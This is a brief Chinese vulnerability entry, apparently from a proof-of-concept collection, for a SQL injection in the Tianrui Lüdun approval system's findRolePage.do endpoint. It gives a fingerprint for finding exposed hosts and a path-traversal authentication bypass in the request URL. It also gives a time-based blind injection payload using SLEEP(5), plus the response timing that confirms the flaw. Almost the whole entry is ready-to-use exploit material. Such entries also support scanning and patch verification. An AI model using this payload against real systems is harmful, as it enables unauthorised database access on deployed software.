# 天锐绿盾审批系统findRolePage.doSQL注入漏洞

天锐绿盾 ｜ SQL注入 ｜ —
- **指纹**：`body="location.href=location.href+\"`
- **请求**：`POST /trwfe/login.jsp/.%2e/role/findRolePage.do HTTP/1.1`

**Payload**
```
sort=id+OR+(SELECT+5244+FROM+(SELECT(SLEEP(5)))HAjH)&order=asc
```
- **响应特征**：200 响应时间>=5s